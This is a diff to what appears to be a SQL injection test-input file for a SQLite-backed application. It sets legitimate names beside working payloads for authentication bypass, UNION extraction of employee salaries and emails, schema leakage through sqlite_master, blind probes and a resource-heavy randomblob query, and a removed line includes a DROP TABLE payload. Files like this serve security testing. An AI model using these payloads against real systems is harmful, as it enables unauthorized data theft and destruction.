@@ -1,13 +1,49 @@
-alice
-bob
-admin
-' OR '1'='1
-admin' --
+# =====================================================
+# NORMAL INPUTS (LEGITIMATE)
+# =====================================================
+Amit Sharma
+Neha Verma
+Rahul Mehta
+Admin
+
+
+# =====================================================
+# DATA LEAK PAYLOADS (RETURN ROWS / EXTRACT DATA)
+# =====================================================
+
+# --- Authentication Bypass ---
+' OR '1'='1' --
 ' OR 1=1 --
-' UNION SELECT username, password FROM users --
-' OR 'a'='a
-'; DROP TABLE users; --
-' OR SLEEP(5) --
+' OR 'a'='a' --
+admin' --
+
+# --- UNION-Based Data Extraction ---
+' UNION SELECT emp_id,name,role,email FROM employees --
+' UNION SELECT name,salary,access_level,email FROM employees --
+' UNION SELECT emp_id,role,salary,access_level FROM employees --
+
+# --- Database Structure Leakage (SQLite) ---
+' UNION SELECT name,sql,NULL,NULL FROM sqlite_master --
+' UNION SELECT tbl_name,sql,NULL,NULL FROM sqlite_master --
+' UNION SELECT NULL,sqlite_version(),NULL,NULL --
+
+
+# =====================================================
+# DETECTION / BLIND PAYLOADS (NO DATA LEAK EXPECTED)
+# =====================================================
+
+# --- Boolean-Based Blind SQLi ---
+' AND 1=1 --
+' AND 1=2 --
+
+# --- Existence & Logic Testing ---
+' AND EXISTS (SELECT 1 FROM employees) --
+
+# --- Comment & Quote Manipulation ---
+' --
+' /*
 "' OR "" = "
-' or '1'='1' /*
-' UNION SELECT null,null --
+' OR '1'='1' /*
+
+# --- Heavy Query (Time-Like Behavior in SQLite) ---
+' AND randomblob(1000000000) --
